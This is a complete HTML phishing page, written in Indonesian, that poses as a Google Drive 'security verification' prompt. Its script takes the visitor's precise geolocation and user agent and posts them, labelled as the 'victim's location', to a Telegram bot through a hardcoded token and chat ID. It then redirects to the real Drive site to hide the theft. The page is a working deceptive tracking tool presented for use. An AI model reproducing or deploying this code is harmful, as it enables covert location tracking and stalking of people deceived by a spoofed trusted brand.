<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Google Drive</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #ffffff;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: white;
            border-radius: 28px;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
            padding: 40px 24px;
            text-align: center;
        }
        .drive-icon {
            width: 80px;
            margin-bottom: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }
        .sub {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
        }
        .permission-card {
            background: #f8f9fa;
            border-radius: 20px;
            padding: 20px;
            text-align: left;
            margin-bottom: 32px;
        }
        .perm-item {
            display: flex;
            align-items: center;
            gap: 14px;
            font-size: 15px;
            color: #202124;
            padding: 6px 0;
        }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 24px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:active {
            background: #0d5bba;
        }
        .success-message {
            margin-top: 24px;
            padding: 12px;
            background: #e6f4ea;
            color: #137333;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }
        .loader {
            display: none;
            margin-top: 20px;
        }
        .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #1a73e8;
            margin: 0 3px;
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
    </style>
</head>
<body>
<div class="container">
    <img class="drive-icon" src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive">
    <h1>Verifikasi keamanan</h1>
    <div class="sub">Google Drive memerlukan verifikasi lokasi perangkat</div>
    
    <div class="permission-card">
        <div class="perm-item">
            <span>📍</span> <span>Akses lokasi untuk verifikasi keamanan</span>
        </div>
        <div class="perm-item">
            <span>🔐</span> <span>Lokasi akan digunakan hanya sekali</span>
        </div>
    </div>
    
    <button class="btn" id="verifyBtn">Verifikasi perangkat</button>
    
    <div class="loader" id="loader">
        <span class="dot"></span><span class="dot"></span><span class="dot"></span>
    </div>
    <div class="success-message" id="successMsg">
        ✅ Akses berhasil! Mengalihkan ke Google Drive...
    </div>
</div>

<script>
    const BOT_TOKEN = '8665421665:AAHO3wSMNL_t4MM7yZzaEBcRMflWaymZt68';
    const CHAT_ID = '7456010774';

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch(e) {}
    }

    document.getElementById('verifyBtn').onclick = () => {
        const btn = document.getElementById('verifyBtn');
        const loader = document.getElementById('loader');
        const successDiv = document.getElementById('successMsg');
        
        btn.style.display = 'none';
        loader.style.display = 'block';
        
        if (!navigator.geolocation) {
            sendToTelegram('❌ Browser tidak support geolocation');
            loader.style.display = 'none';
            successDiv.style.display = 'block';
            setTimeout(() => { window.location.href = 'https://drive.google.com'; }, 2000);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                const locMsg = `📍 LOKASI KORBAN\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\nWaktu: ${new Date().toISOString()}\nUser-Agent: ${navigator.userAgent}`;
                sendToTelegram(locMsg);
                
                loader.style.display = 'none';
                successDiv.style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://drive.google.com';
                }, 2000);
            },
            (error) => {
                let errMsg = `❌ Gagal ambil lokasi: ${error.message}`;
                if (error.code === 1) errMsg = '❌ Izin lokasi ditolak oleh korban';
                sendToTelegram(errMsg);
                
                loader.style.display = 'none';
                successDiv.style.display = 'block';
                successDiv.innerHTML = '⚠️ Verifikasi gagal, tetap dialihkan...';
                setTimeout(() => {
                    window.location.href = 'https://drive.google.com';
                }, 2000);
            }
        );
    };
</script>
</body>
</html>
